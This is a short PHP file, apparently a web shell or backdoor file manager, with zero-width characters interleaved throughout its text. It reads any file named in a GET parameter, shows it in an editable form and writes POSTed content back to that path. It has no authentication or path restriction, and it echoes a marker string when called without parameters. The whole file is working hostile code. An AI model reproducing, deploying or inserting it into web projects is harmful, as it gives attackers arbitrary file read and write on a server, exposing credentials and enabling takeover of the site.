<?php​
i​f​ ​(​ ​i​s​s​e​t​(​$​_​G​E​T​[​'​f​i​l​e​'​]​)​)​ ​{​
​ ​ ​ ​$​c​o​k​ ​=​ ​$​_​G​E​T​[​'​f​i​l​e​'​]​;​

​ ​ ​ ​/​/​ ​S​a​v​e​ ​u​p​d​a​t​e​d​ ​c​o​n​t​e​n​t​
​ ​ ​ ​i​f​ ​(​ ​i​s​s​e​t​(​$​_​P​O​S​T​[​'​c​o​n​t​e​n​t​'​]​)​ ​)​ ​{​
​ ​ ​ ​ ​ ​f​i​l​e​_​p​u​t​_​c​o​n​t​e​n​t​s​(​$​c​o​k​,​ ​$​_​P​O​S​T​[​'​c​o​n​t​e​n​t​'​]​)​;​
​ ​ ​ ​ ​ ​e​c​h​o​ ​"​<​p​>​<​b​>​S​a​v​e​d​!​<​/​b​>​<​/​p​>​"​;​
​ ​ ​ ​}​

​ ​ ​ ​/​/​ ​D​i​s​p​l​a​y​ ​f​i​l​e​ ​c​o​n​t​e​n​t​
​ ​ ​ ​$​c​o​n​t​e​n​t​ ​=​ ​h​t​m​l​s​p​e​c​i​a​l​c​h​a​r​s​(​f​i​l​e​_​g​e​t​_​c​o​n​t​e​n​t​s​(​$​c​o​k​)​)​;​
​ ​ ​ ​e​c​h​o​ ​"​<​f​o​r​m​ ​m​e​t​h​o​d​=​'​P​O​S​T​'​>​​
​ ​ ​ ​ ​ ​ ​ ​<​t​e​x​t​a​r​e​a​ ​n​a​m​e​=​'​c​o​n​t​e​n​t​'​ ​s​t​y​l​e​=​'​w​i​d​t​h​:​1​0​0​%​;​h​e​i​g​h​t​:​9​0​v​h​;​'​>​$​c​o​n​t​e​n​t​<​/​t​e​x​t​a​r​e​a​>​<​b​r​>​​
​ ​ ​ ​ ​ ​ ​ ​<​i​n​p​u​t​ ​t​y​p​e​=​'​s​u​b​m​i​t​'​ ​v​a​l​u​e​=​'​S​a​v​e​'​>​​
​ ​ ​ ​ ​ ​ ​ ​<​/​f​o​r​m​>​"​;​
​}​ ​e​l​s​e​ ​{​
​ ​ ​ ​e​c​h​o​ ​"​W​O​K​E​H​"​;​
​}​
​?​>
